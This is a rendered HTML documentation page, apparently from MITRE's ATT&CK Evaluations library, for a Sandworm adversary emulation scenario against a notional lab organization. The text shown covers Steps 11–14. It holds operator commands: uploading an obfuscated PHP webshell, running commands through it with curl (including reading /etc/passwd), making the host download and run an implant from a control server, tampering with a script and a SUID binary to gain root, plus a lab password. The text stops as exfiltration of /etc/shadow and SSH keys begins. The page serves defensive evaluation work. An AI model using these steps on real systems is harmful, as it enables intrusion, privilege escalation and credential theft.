@@ -1,0 +1,973 @@
+<!DOCTYPE html>
+<html lang="en" class="h-full">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <meta name="turbo-root" content="/ael">
+    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="3.5.0.771964962339">
+
+    <!-- See retype.com -->
+    <meta name="generator" content="Retype 3.5.0">
+
+    <!-- Primary Meta Tags -->
+    <title>Scenario Overview</title>
+    <meta name="title" content="Scenario Overview">
+    <meta name="description" content="This scenario emulates Sandworm compromising a notional organization (Dune Inc.) with the goal of destroying data.">
+
+    <!-- Canonical -->
+    <link rel="canonical" href="https://attackevals.github.io/ael/enterprise/sandworm/emulation_plan/scenario_2/">
+
+    <!-- Open Graph / Facebook -->
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://attackevals.github.io/ael/enterprise/sandworm/emulation_plan/scenario_2/">
+    <meta property="og:title" content="Scenario Overview">
+    <meta property="og:description" content="This scenario emulates Sandworm compromising a notional organization (Dune Inc.) with the goal of destroying data.">
+
+    <!-- Twitter -->
+    <meta property="twitter:card" content="summary_large_image">
+    <meta property="twitter:url" content="https://attackevals.github.io/ael/enterprise/sandworm/emulation_plan/scenario_2/">
+    <meta property="twitter:title" content="Scenario Overview">
+    <meta property="twitter:description" content="This scenario emulates Sandworm compromising a notional organization (Dune Inc.) with the goal of destroying data.">
+
+    <script data-cfasync="false">(function () { var el = document.documentElement, m = localStorage.getItem("doc_theme"), wm = window.matchMedia; if (m === "dark" || (!m && wm && wm("(prefers-color-scheme: dark)").matches)) { el.classList.add("dark") } else { el.classList.remove("dark") } })();</script>
+
+    <link href="../../../../resources/css/retype.css?v=3.5.0.771964962339" rel="stylesheet">
+
+    <script data-cfasync="false" src="../../../../resources/js/config.js?v=3.5.0.771964962339" data-turbo-eval="false" defer></script>
+    <script data-cfasync="false" src="../../../../resources/js/retype.js?v=3.5.0" data-turbo-eval="false" defer></script>
+    <script id="lunr-js" data-cfasync="false" src="../../../../resources/js/lunr.js?v=3.5.0.771964962339" data-turbo-eval="false" defer></script>
+    <script id="prism-js" data-cfasync="false" src="../../../../resources/js/prism.js?v=3.5.0.771964962339" defer></script>
+</head>
+<body>
+    <div id="docs-app" class="relative text-base antialiased text-gray-700 bg-white font-body dark:bg-dark-850 dark:text-dark-300">
+        <div class="absolute bottom-0 left-0 bg-gray-100 dark:bg-dark-800" style="top: 5rem; right: 50%"></div>
+    
+        <header id="docs-site-header" class="sticky top-0 z-30 flex w-full h-16 bg-white border-b border-gray-200 md:h-20 dark:bg-dark-850 dark:border-dark-650">
+            <div class="container relative flex items-center justify-between pr-6 grow md:justify-start">
+                <!-- Mobile menu button skeleton -->
+                <button v-cloak class="skeleton docs-mobile-menu-button flex items-center justify-center shrink-0 overflow-hidden dark:text-white focus:outline-none rounded-full w-10 h-10 ml-3.5 md:hidden"><svg xmlns="http://www.w3.org/2000/svg" class="mb-px shrink-0" width="24" height="24" viewBox="0 0 24 24" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor"><path d="M2 4h20v2H2zM2 11h20v2H2zM2 18h20v2H2z"></path></g></svg></button>
+                <div v-cloak id="docs-sidebar-toggle"></div>
+        
+                <!-- Logo -->
+                <div class="flex items-center justify-between h-full py-2 md:w-75">
+                    <div class="flex items-center px-2 md:px-6">
+                        <a id="docs-site-logo" href="../../../../" class="flex items-center leading-snug text-xl">
+                            <span class="w-10 mr-2 grow-0 shrink-0 overflow-hidden">
+                                <img class="max-h-10 dark:hidden md:inline-block" src="../../../../images/attackevals-logo.png">
+                                <img class="max-h-10 hidden dark:inline-block" src="../../../../images/attackevals-logo.png">
+                            </span>
+                            <span class="dark:text-white font-semibold line-clamp-1 md:line-clamp-2">ATTACK Evaluation Library</span>
+                        </a>
+                    </div>
+        
+                    <span class="hidden h-8 border-r md:inline-block dark:border-dark-650"></span>
+                </div>
+        
+                <div class="flex justify-between md:grow">
+                    <!-- Top Nav -->
+                    <nav class="hidden md:flex">
+                        <ul class="flex flex-col mb-4 md:pl-16 md:mb-0 md:flex-row md:items-center">
+                            <li class="mr-6">
+                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://attackevals.mitre-engenuity.org">Attack Evaluations</a>
+                            </li>
+        
+                        </ul>
+                    </nav>
+        
+                    <!-- Header Right Skeleton -->
+                    <div v-cloak class="flex justify-end grow skeleton">
+        
+                        <!-- Search input mock -->
+                        <div class="relative hidden w-40 lg:block lg:max-w-sm lg:ml-auto">
+                            <div class="absolute flex items-center justify-center h-full pl-3 dark:text-dark-300">
+                                <svg xmlns="http://www.w3.org/2000/svg" class="icon-base" width="16" height="16" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 1px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
+                            </div>
+                            <input class="w-full h-10 placeholder-gray-400 transition-colors duration-200 ease-in bg-gray-200 border border-transparent rounded md:text-sm hover:bg-white hover:border-gray-300 focus:outline-none focus:bg-white focus:border-gray-500 dark:bg-dark-600 dark:border-dark-600 dark:placeholder-dark-400" style="padding: 0.625rem 0.75rem 0.625rem 2rem" type="text" placeholder="Search">
+                        </div>
+        
+                        <!-- Mobile search button -->
+                        <div class="flex items-center justify-center w-10 h-10 lg:hidden">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="20" height="20" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
+                        </div>
+        
+                        <!-- Dark mode switch placeholder -->
+                        <div class="w-10 h-10 lg:ml-2"></div>
+        
+                        <!-- History button -->
+                        <div class="flex items-center justify-center w-10 h-10" style="margin-right: -0.625rem;">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="22" height="22" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor" ><g ><path d="M12.01 6.01c-.55 0-1 .45-1 1V12a1 1 0 00.4.8l3 2.22a.985.985 0 001.39-.2.996.996 0 00-.21-1.4l-2.6-1.92V7.01c.02-.55-.43-1-.98-1z"></path><path d="M12.01 1.91c-5.33 0-9.69 4.16-10.05 9.4l-.29-.26a.997.997 0 10-1.34 1.48l1.97 1.79c.19.17.43.26.67.26s.48-.09.67-.26l1.97-1.79a.997.997 0 10-1.34-1.48l-.31.28c.34-4.14 3.82-7.41 8.05-7.41 4.46 0 8.08 3.63 8.08 8.09s-3.63 8.08-8.08 8.08c-2.18 0-4.22-.85-5.75-2.4a.996.996 0 10-1.42 1.4 10.02 10.02 0 007.17 2.99c5.56 0 10.08-4.52 10.08-10.08.01-5.56-4.52-10.09-10.08-10.09z"></path></g></g></svg>
+                        </div>
+                    </div>
+        
+                    <div v-cloak class="flex justify-end grow">
+                        <div id="docs-mobile-search-button"></div>
+                        <doc-search-desktop></doc-search-desktop>
+        
+                        <doc-theme-switch class="lg:ml-2"></doc-theme-switch>
+                        <doc-history></doc-history>
+                    </div>
+                </div>
+            </div>
+        </header>
+    
+        <div class="container relative flex bg-white">
+            <!-- Sidebar Skeleton -->
+            <div v-cloak class="fixed flex flex-col shrink-0 duration-300 ease-in-out bg-gray-100 border-gray-200 sidebar top-20 w-75 border-r h-screen md:sticky transition-transform skeleton dark:bg-dark-800 dark:border-dark-650">
+            
+                <!-- Render this div, if config.showSidebarFilter is `true` -->
+                <div class="flex items-center h-16 px-6">
+                    <input class="w-full h-8 px-3 py-2 transition-colors duration-200 ease-linear bg-white border border-gray-200 rounded shadow-none text-sm focus:outline-none focus:border-gray-600 dark:bg-dark-600 dark:border-dark-600" type="text" placeholder="Filter">
+                </div>
+            
+                <div class="pl-6 mt-1 mb-4">
+                    <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                </div>
+            
+            </div>
+            
+            <!-- Sidebar component -->
+            <doc-sidebar v-cloak>
+                <template #sidebar-footer>
+                    <div class="shrink-0 mt-auto border-t md:bg-transparent md:border-none dark:border-dark-650">
+            
+                        <div class="py-3 px-6 md:hidden border-b dark:border-dark-650">
+                            <nav>
+                                <ul class="flex flex-wrap justify-center items-center">
+                                    <li class="mr-6">
+                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://attackevals.mitre-engenuity.org">Attack Evaluations</a>
+                                    </li>
+            
+                                </ul>
+                            </nav>
+                        </div>
+                    </div>
+                </template>
+            </doc-sidebar>
+    
+            <div class="grow min-w-0 dark:bg-dark-850">
+                <!-- Render "toolbar" template here on api pages --><!-- Render page content -->
+                <div class="flex">
+                    <div class="min-w-0 p-4 grow md:px-16">
+                        <main class="relative pb-12 lg:pt-2">
+                            <div class="docs-markdown" id="docs-content">
+                                <!-- Rendered if sidebar right is enabled -->
+                                <div id="docs-sidebar-right-toggle"></div>
+                                <nav class="breadcrumb" aria-label="Breadcrumb">
+                                    <ol role="list">
+                                        <li class="pr-4">
+                                            <a href="../../../../" class="pr-4">
+                                                ATT&​CK Evaluations Library Overview
+                                            </a>
+                                            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
+                                                <path d="M8.72 18.78a.75.75 0 0 1 0-1.06L14.44 12 8.72 6.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0Z"/>
+                                            </svg>
+                                        </li>
+                                        <li class="pr-4">
+                                            <span class="pr-4">
+                                                Enterprise
+                                            </span>
+                                            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
+                                                <path d="M8.72 18.78a.75.75 0 0 1 0-1.06L14.44 12 8.72 6.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0Z"/>
+                                            </svg>
+                                        </li>
+                                        <li class="pr-4">
+                                            <a href="../../../../enterprise/sandworm/" class="pr-4">
+                                                Sandworm
+                                            </a>
+                                            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
+                                                <path d="M8.72 18.78a.75.75 0 0 1 0-1.06L14.44 12 8.72 6.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0Z"/>
+                                            </svg>
+                                        </li>
+                                        <li class="pr-4">
+                                            <span class="pr-4">
+                                                Emulation Plan
+                                            </span>
+                                            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
+                                                <path d="M8.72 18.78a.75.75 0 0 1 0-1.06L14.44 12 8.72 6.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0Z"/>
+                                            </svg>
+                                        </li>
+                                        <li class="pr-4">
+                                            <a href="../../../../enterprise/sandworm/emulation_plan/scenario_2/" class="pr-4">
+                                                Scenario Overview
+                                            </a>
+                                        </li>
+                                    </ol>
+                                </nav>
+                
+                                <!-- Page content  -->
+<doc-anchor-target id="scenario-overview" class="break-words">
+    <h1>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#scenario-overview">#</doc-anchor-trigger>
+        <span>Scenario Overview</span>
+    </h1>
+</doc-anchor-target>
+<p>This scenario emulates Sandworm compromising a notional organization (Dune Inc.) with the goal of destroying data.</p>
+<p>This scenario emulates Sandworm TTPs based on several malware specimens either used by or associated with the Sandworm actors:</p>
+<ol>
+<li>P.A.S. Webshell</li>
+<li>Exaramel (Linux and Windows variants)</li>
+<li>NotPetya</li>
+</ol>
+<p><figure class="content-center">
+    <img src="../../resources/images/sandworm20protections.drawio.png" alt="Sandworm Protections Diagram">
+    <figcaption class="caption">Sandworm Protections Diagram</figcaption>
+</figure>
+</p>
+<hr>
+<doc-anchor-target id="test-7-steps-11-14">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#test-7-steps-11-14">#</doc-anchor-trigger>
+        <span>Test 7 (Steps 11-14)</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="step-11---initial-compromise">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#step-11---initial-compromise">#</doc-anchor-trigger>
+        <span>Step 11 - Initial Compromise</span>
+    </h3>
+</doc-anchor-target>
+<p><span class="docs-emoji">&#x1F3A4;</span> <code v-pre>voice track</code></p>
+<p>Sandworm logs into patient zero via SSH using Valid Accounts for the user fherbert.</p>
+<p>It is unknown how Sandworm obtained the credentials (perhaps an SSH password guessing attack, or zero day exploit).</p>
+<p>Sandworm then deploys a PHP webshell for persistent access.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">Compromised user info:
+
+User:	fherbert
+
+File write: /tmp/search.php, /var/www/html/search.php
+
+System: 10.0.1.5 / caladan
+
+C2:	192.168.0.4 connects to 10.0.1.5:443 via HTTPS (self signed cert)</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="procedures">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x2623;&#xFE0F;</span> Procedures</span>
+    </h3>
+</doc-anchor-target>
+<p>Upload P.A.S. webshell to caladan/10.0.1.5 as <code v-pre>/tmp/search.php</code>.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash"># Sandworm Team have used previously acquired legitimate credentials prior to attacks.
+
+# Sandworm Team has used webshells including P.A.S. Webshell to maintain access to victim networks.
+
+scp sandworm/Resources/phpWebShell/obfuscated_webShell.php fherbert@10.0.1.5:/tmp/search.php</code></pre>
+</doc-codeblock></div>
+<p>Password:</p>
+<p><code v-pre>Whg42WbhhCE17FEzrqeJ</code></p>
+<p>Move P.A.S. webshell to <code v-pre>/var/www/html</code> so it can be invoked via httpd.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">ssh fherbert@10.0.1.5 &quot;sudo mv /tmp/search.php /var/www/html/&quot;</code></pre>
+</doc-codeblock></div>
+<p><a href="../../resources/phpwebshell/webshell.php">Source Code</a></p>
+<p><a href="../../resources/phpwebshell/obfuscated_webshell.php">Source Code - Obfuscated</a></p>
+<doc-anchor-target id="cited-intelligence">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#cited-intelligence">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x1F52C;</span> Cited Intelligence</span>
+    </h3>
+</doc-anchor-target>
+<ul>
+<li><p><a href="https://www.us-cert.gov/ics/alerts/IR-ALERT-H-16-056-01" class="outbound" target="_blank"><span>https://www.us-cert.gov/ics/alerts/IR-ALERT-H-16-056-01</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></p>
+</li>
+<li><p><a href="https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-005.pdf" class="outbound" target="_blank"><span>https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-005.pdf</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></p>
+</li>
+</ul>
+<br>
+<doc-anchor-target id="step-12---initial-discovery">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#step-12---initial-discovery">#</doc-anchor-trigger>
+        <span>Step 12 - Initial Discovery</span>
+    </h3>
+</doc-anchor-target>
+<p><span class="docs-emoji">&#x1F3A4;</span> <code v-pre>voice track</code></p>
+<p>Sandworm enumerates information about the compromised system by issuing shell commands through the PHP webshell.</p>
+<p>Executed commands include whoami, uname, ls, among others.</p>
+<doc-anchor-target id="procedures">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x2623;&#xFE0F;</span> Procedures</span>
+    </h3>
+</doc-anchor-target>
+<p>Execute <code v-pre>whoami</code> from P.A.S. webshell.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash"># Sandworm Team has collected the username from a compromised host.
+
+curl --insecure &quot;https://10.0.1.5/search.php?cmd=whoami&quot;</code></pre>
+</doc-codeblock></div>
+<p><span class="docs-emoji">&#x2139;&#xFE0F;</span> The &#x27;--insecure&#x27; option is used so that curl ignores self-signed certificate warnings. Self-signed certificates are used on host Caladan/10.0.1.5 for the scenario.</p>
+<p>Execute <code v-pre>uname -a</code> from P.A.S. webshell.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash"># Sandworm Team used a backdoor to enumerate information about the infected system's operating system.
+
+curl --insecure &quot;https://10.0.1.5/search.php?cmd=uname+-a&quot;</code></pre>
+</doc-codeblock></div>
+<p>Execute <code v-pre>ls -lsahR</code> from P.A.S. webshell.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash"># Sandworm Team has enumerated files on a compromised host.
+
+# P.A.S. Webshell has the ability to list files and file characteristics including extension, size, ownership, and permissions.
+
+curl --insecure &quot;https://10.0.1.5/search.php?cmd=ls+-lsahR+/&quot;</code></pre>
+</doc-codeblock></div>
+<p>Execute <code v-pre>cat /etc/passwd</code> from P.A.S. webshell.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash"># P.A.S. Webshell can display the /etc/passwd file on a compromised host.
+
+curl --insecure &quot;https://10.0.1.5/search.php?cmd=cat+/etc/passwd&quot;</code></pre>
+</doc-codeblock></div>
+<p><a href="../../resources/phpwebshell/webshell.php#L35">Source Code</a></p>
+<doc-anchor-target id="cited-intelligence">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#cited-intelligence">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x1F52C;</span> Cited Intelligence</span>
+    </h3>
+</doc-anchor-target>
+<ul>
+<li><p><a href="https://www.justice.gov/opa/press-release/file/1328521/download" class="outbound" target="_blank"><span>https://www.justice.gov/opa/press-release/file/1328521/download</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></p>
+</li>
+<li><p><a href="https://www.welivesecurity.com/2017/07/04/analysis-of-telebots-cunning-backdoor/" class="outbound" target="_blank"><span>https://www.welivesecurity.com/2017/07/04/analysis-of-telebots-cunning-backdoor/</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></p>
+</li>
+</ul>
+<br>
+<doc-anchor-target id="step-13---upload-and-execute-exaramel-linux-variant">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#step-13---upload-and-execute-exaramel-linux-variant">#</doc-anchor-trigger>
+        <span>Step 13 - Upload and Execute Exaramel (Linux Variant)</span>
+    </h3>
+</doc-anchor-target>
+<p><span class="docs-emoji">&#x1F3A4;</span> <code v-pre>voice track</code></p>
+<p>Sandworm downloads an ELF executable from the control server using curl.</p>
+<p>The ELF executable is an implant based on Exaramel-Linux.</p>
+<p>Once downloaded to disk, Sandworm sets Exaramel-Linux&#x27;s file permissions to read-write-execute.</p>
+<p>Finally, Sandworm executes Exaramel-Linux.</p>
+<p>Exaramel-Linux establishes HTTPS C2 with the control server.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">C2 Info
+
+Connects to: 192.168.0.4:443
+
+Protocol: HTTPS
+
+File write: /var/www/html/centreon_module_linux_app64</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="procedures">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x2623;&#xFE0F;</span> Procedures</span>
+    </h3>
+</doc-anchor-target>
+<p><span class="docs-emoji">&#x26A0;&#xFE0F;</span> Open a new terminal tab (ctrl+shift+t) and start the control server.</p>
+<p>Double click the terminal tab to change its name. Name your terminal tab &quot;control server&quot; for easy identification.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">cd wizard_spider/Resources/control_server &amp;&amp; sudo ./controlServer</code></pre>
+</doc-codeblock></div>
+<p><span class="docs-emoji">&#x26A0;&#xFE0F;</span> Go back to your P.A.S. webshell terminal.</p>
+<p>Execute <code v-pre>curl</code> to download Exaramel-Linux to <code v-pre>/var/www/html/centreon_module_linux_app64</code>:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash"># P.A.S. Webshell can upload and download files to and from compromised hosts.
+
+curl --insecure &quot;https://10.0.1.5/search.php?cmd=curl+--insecure+https://192.168.0.4/getFile/Exaramel-Linux+-o+centreon_module_linux_app64&quot;</code></pre>
+</doc-codeblock></div>
+<p>Confirm &#x27;centreon_module_linux_app64&#x27; downloaded successfully:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">curl --insecure &quot;https://10.0.1.5/search.php?cmd=ls+-lsah&quot;</code></pre>
+</doc-codeblock></div>
+<p>Make Exaramel-Linux executable via <code v-pre>chmod</code>.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash"># P.A.S. Webshell has the ability to modify file permissions.
+
+curl --insecure &quot;https://10.0.1.5/search.php?cmd=chmod+755+centreon_module_linux_app64&quot;</code></pre>
+</doc-codeblock></div>
+<p>Insert 1-liner into <code v-pre>/var/www/html/include/tools/check.sh</code>; the 1-liner executes Exaramel-Linux.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">curl --insecure &quot;https://10.0.1.5/search.php?cmd=echo%20%27%2Fvar%2Fwww%2Fhtml%2Fcentreon_module_linux_app64%20%26%27%20%3E%3E%20%2Fvar%2Fwww%2Fhtml%2Finclude%2Ftools%2Fcheck.sh&quot;</code></pre>
+</doc-codeblock></div>
+<p>Execute SUID binary, <code v-pre>/bin/backup</code>; this binary executes <code v-pre>check.sh</code> from the previous step, which causes Exaramel-Linux to be executed with root privileges.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash"># Exaramel for Linux can execute commands with high privileges via a specific binary with setuid functionality.
+
+curl --insecure &quot;https://10.0.1.5/search.php?cmd=/bin/backup&quot; &amp;</code></pre>
+</doc-codeblock></div>
+<p><a href="../../resources/suid-binary/suid-binary.c">Source Code</a></p>
+<p><span class="docs-emoji">&#x26A0;&#xFE0F;</span> Switch to your controlServer tab; you should have a new callback.</p>
+<doc-anchor-target id="cited-intelligence">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#cited-intelligence">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x1F52C;</span> Cited Intelligence</span>
+    </h3>
+</doc-anchor-target>
+<ul>
+<li><a href="https://www.justice.gov/opa/press-release/file/1328521/download" class="outbound" target="_blank"><span>https://www.justice.gov/opa/press-release/file/1328521/download</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></li>
+</ul>
+<br>
+<doc-anchor-target id="step-14---exaramel-linux-persistence">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#step-14---exaramel-linux-persistence">#</doc-anchor-trigger>
+        <span>Step 14 - Exaramel Linux Persistence</span>
+    </h3>
+</doc-anchor-target>
+<p><span class="docs-emoji">&#x1F3A4;</span> <code v-pre>voice track</code></p>
+<p>During this step, Sandworm establishes crontab and systemd persistence.</p>
+<p>Sandworm then exfils /etc/shadow, bash history, and fherbert&#x27;s SSH keys over the existing C2 channel.</p>
+<p>In the next step, Sandworm uses credentials derived from the /etc/shadow file to attack a lateral host.</p>
+<doc-anchor-target id="procedures">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x2623;&#xFE0F;</span> Procedures</span>
+    </h3>
+</doc-anchor-target>
+<p>From your control server tab, split the window horizontally:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
